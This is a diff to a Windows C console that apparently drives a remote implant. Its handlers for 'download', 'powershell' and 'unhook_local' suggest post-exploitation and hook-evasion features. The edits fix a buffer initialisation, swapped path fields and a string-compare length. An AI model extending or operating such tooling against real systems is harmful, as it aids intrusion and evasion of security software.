@@ -4,6 +4,7 @@
 #include<string.h>
 #include<ctype.h>
 
+#define WIN32_LEAN_AND_MEAN
 #include<Shlwapi.h>
 #pragma comment(lib, "Shlwapi.lib")
 
@@ -41,6 +42,8 @@ void _print_prompt(struct cli_info_t* cli_info,
 #define PATH_TO   1
 
 int _from_to_paths(char* input, char from_to_tuple[2][255]) {
+	memset(from_to_tuple, 0, sizeof(char[2][255]));
+
 	char* tok;
 	char* file_name_ptr;
 	char* context = NULL;
@@ -384,17 +387,17 @@ int _handle_download(char* user_input,
 
 	strncpy_s(params->local_path,
 		255,
-		from_to_tuple[PATH_FROM],
-		_TRUNCATE
-	);
-	params->local_path_len = strlen(from_to_tuple[PATH_FROM]);
-
-	strncpy_s(params->remote_path,
-		255,
 		from_to_tuple[PATH_TO],
 		_TRUNCATE
 	);
-	params->remote_path_len = strlen(from_to_tuple[PATH_TO]);
+	params->local_path_len = strlen(from_to_tuple[PATH_TO]);
+
+	strncpy_s(params->remote_path,
+		255,
+		from_to_tuple[PATH_FROM],
+		_TRUNCATE
+	);
+	params->remote_path_len = strlen(from_to_tuple[PATH_FROM]);
 
 	CreateThread(NULL, 0, thread_download, params, 0, 0);
 
@@ -462,7 +465,7 @@ int _handle_user_input(char* user_input,
 		if (strncmp(first_word, "download", 8) == 0) {
 			return _handle_download(user_input, &tok_ctx, cli_info, ctx);
 		}
-		if (strncmp(first_word, "unhook_local", 13) == 0) {
+		if (strncmp(first_word, "unhook_local", 12) == 0) {
 			return _handle_unhook_local(user_input, &tok_ctx, cli_info, ctx);
 		}
 		if (strncmp(first_word, "powershell", 10) == 0) {
